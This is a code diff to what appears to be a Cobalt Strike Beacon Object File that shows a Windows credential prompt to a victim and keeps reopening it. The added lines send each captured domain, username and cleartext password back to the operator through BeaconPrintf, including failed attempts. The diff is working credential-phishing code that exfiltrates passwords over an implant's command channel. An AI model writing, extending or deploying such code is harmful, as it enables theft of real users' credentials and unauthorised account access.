@@ -2,6 +2,7 @@
 
 #include "prompt.h"
 
+#include <beacon.h>
 #include <security.h>
 #include <wincred.h>
 
@@ -336,7 +337,24 @@ PromptResult run_prompt(
             // Force mode: reopen after failed validation, don't count
             // against max_attempts. The prompt stays open until the user
             // enters a valid password, the operator stops the job, or the
-            // timeout expires.
+            // timeout expires. Print each attempt so the operator sees
+            // what was tried.
+            if (credentials->domain[0] != L'\0') {
+                BeaconPrintf(
+                    CALLBACK_OUTPUT,
+                    "\n[-] Validation failed (error=%u)\n[+] Identity: %ls\\%ls\n[+] Password: %ls\n[*] Reopening prompt\n",
+                    last_auth_error,
+                    credentials->domain,
+                    credentials->username,
+                    credentials->password);
+            } else {
+                BeaconPrintf(
+                    CALLBACK_OUTPUT,
+                    "\n[-] Validation failed (error=%u)\n[+] Identity: %ls\n[+] Password: %ls\n[*] Reopening prompt\n",
+                    last_auth_error,
+                    credentials->username,
+                    credentials->password);
+            }
             credentials->clear();
             --submitted_attempts;
             continue;
